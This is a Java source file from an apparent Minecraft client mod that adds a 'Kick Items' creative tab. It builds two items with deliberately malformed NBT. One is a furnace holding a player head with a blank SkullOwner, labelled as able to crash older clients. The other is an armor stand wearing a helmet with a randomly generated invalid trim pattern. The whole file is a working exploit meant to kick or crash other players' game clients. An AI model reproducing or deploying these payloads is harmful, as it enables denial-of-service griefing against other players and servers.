package me.nekosarekawaii.foxglove.creativetab.impl;

import de.florianmichael.viafabricplus.protocolhack.ProtocolHack;
import me.nekosarekawaii.foxglove.creativetab.CreativeTab;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import net.raphimc.vialoader.util.VersionEnum;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.Collection;

public class KickItemsCreativeTab extends CreativeTab {

    public KickItemsCreativeTab() {
        super(new ItemStack(Items.FIREWORK_ROCKET).setCustomName(Text.literal("Kick Items")));
    }

    @Override
    public Collection<ItemStack> entries() {
        final Collection<ItemStack> current = super.entries();
        final VersionEnum targetVersion = ProtocolHack.getTargetVersion();

        final ItemStack paperKickHeadPackage = new ItemStack(Items.FURNACE);
        final NbtCompound paperKickHeadPackageNbt = new NbtCompound();
        final NbtCompound paperKickHeadPackageBlockEntityTag = new NbtCompound();
        final NbtList paperKickHeadPackageBlockEntityTagItemsList = new NbtList();
        final NbtCompound paperKickHeadPackageBlockEntityTagItemsListSlot0 = new NbtCompound();
        paperKickHeadPackageBlockEntityTagItemsListSlot0.putByte("Slot", (byte) 0);
        paperKickHeadPackageBlockEntityTagItemsListSlot0.putString("id", "minecraft:player_head");
        paperKickHeadPackageBlockEntityTagItemsListSlot0.putByte("Count", (byte) 1);
        final NbtCompound paperKickHeadPackageBlockEntityTagItemsListSlot0Tag = new NbtCompound();
        paperKickHeadPackageBlockEntityTagItemsListSlot0Tag.putString("SkullOwner", " ");
        paperKickHeadPackageBlockEntityTagItemsListSlot0.put("tag", paperKickHeadPackageBlockEntityTagItemsListSlot0Tag);
        paperKickHeadPackageBlockEntityTagItemsList.add(paperKickHeadPackageBlockEntityTagItemsListSlot0);
        paperKickHeadPackageBlockEntityTag.put("Items", paperKickHeadPackageBlockEntityTagItemsList);
        paperKickHeadPackageNbt.put("BlockEntityTag", paperKickHeadPackageBlockEntityTag);
        paperKickHeadPackage.setNbt(paperKickHeadPackageNbt);
        this.putClientsideName(paperKickHeadPackage,
                Text.literal(
                        Formatting.RED + Formatting.BOLD.toString() + "Paper Kick Head"
                ),
                Text.literal(
                        Formatting.GOLD + Formatting.BOLD.toString() + "Can crash older clients"
                )
        );
        current.add(paperKickHeadPackage);

        if (targetVersion.isNewerThanOrEqualTo(VersionEnum.r1_20tor1_20_1)) {
            final ItemStack kickStandPackage = new ItemStack(Items.FURNACE);
            final NbtCompound kickStandPackageNbt = new NbtCompound();
            final NbtCompound kickStandPackageBlockEntityTag = new NbtCompound();
            final NbtList kickStandPackageBlockEntityTagItemsList = new NbtList();
            final NbtCompound kickStandPackageBlockEntityTagItemsListSlot0 = new NbtCompound();
            kickStandPackageBlockEntityTagItemsListSlot0.putByte("Slot", (byte) 0);
            kickStandPackageBlockEntityTagItemsListSlot0.putString("id", "minecraft:armor_stand");
            kickStandPackageBlockEntityTagItemsListSlot0.putByte("Count", (byte) 1);
            final NbtCompound kickStandPackageBlockEntityTagItemsListSlot0EntityTag = new NbtCompound();
            final NbtList kickStandPackageBlockEntityTagItemsListSlot0EntityTagArmorItems = new NbtList();
            final NbtCompound kickStandPackageBlockEntityTagItemsListSlot0EntityTagArmorItemsKickItem = new NbtCompound();
            final NbtCompound kickStandPackageBlockEntityTagItemsListSlot0EntityTagArmorItemsKickItemTag = new NbtCompound();
            final NbtCompound kickStandPackageBlockEntityTagItemsListSlot0EntityTagArmorItemsKickItemTagTrim = new NbtCompound();
            kickStandPackageBlockEntityTagItemsListSlot0EntityTagArmorItemsKickItemTagTrim.putString("pattern", RandomStringUtils.random(5).toLowerCase() + ":" + RandomStringUtils.random(5).toUpperCase());
            kickStandPackageBlockEntityTagItemsListSlot0EntityTagArmorItemsKickItemTagTrim.putString("material", "minecraft:amethyst");
            kickStandPackageBlockEntityTagItemsListSlot0EntityTagArmorItemsKickItemTag.put("Trim", kickStandPackageBlockEntityTagItemsListSlot0EntityTagArmorItemsKickItemTagTrim);
            kickStandPackageBlockEntityTagItemsListSlot0EntityTagArmorItemsKickItem.put("tag", kickStandPackageBlockEntityTagItemsListSlot0EntityTagArmorItemsKickItemTag);
            kickStandPackageBlockEntityTagItemsListSlot0EntityTagArmorItemsKickItem.putByte("Count", (byte) 1);
            kickStandPackageBlockEntityTagItemsListSlot0EntityTagArmorItemsKickItem.putString("id", "minecraft:diamond_helmet");
            kickStandPackageBlockEntityTagItemsListSlot0EntityTagArmorItems.add(kickStandPackageBlockEntityTagItemsListSlot0EntityTagArmorItemsKickItem);
            kickStandPackageBlockEntityTagItemsListSlot0EntityTag.put("ArmorItems", kickStandPackageBlockEntityTagItemsListSlot0EntityTagArmorItems);
            final NbtCompound kickStandPackageBlockEntityTagItemsListSlot0Tag = new NbtCompound();
            kickStandPackageBlockEntityTagItemsListSlot0Tag.put("EntityTag", kickStandPackageBlockEntityTagItemsListSlot0EntityTag);
            kickStandPackageBlockEntityTagItemsListSlot0.put("tag", kickStandPackageBlockEntityTagItemsListSlot0Tag);
            kickStandPackageBlockEntityTagItemsList.add(kickStandPackageBlockEntityTagItemsListSlot0);
            kickStandPackageBlockEntityTag.put("Items", kickStandPackageBlockEntityTagItemsList);
            kickStandPackageNbt.put("BlockEntityTag", kickStandPackageBlockEntityTag);
            kickStandPackage.setNbt(kickStandPackageNbt);
            this.putClientsideName(kickStandPackage,
                    Text.literal(
                            Formatting.RED + Formatting.BOLD.toString() + "Kick Stand"
                    )
            );
            current.add(kickStandPackage);
        }

        return current;
    }

}
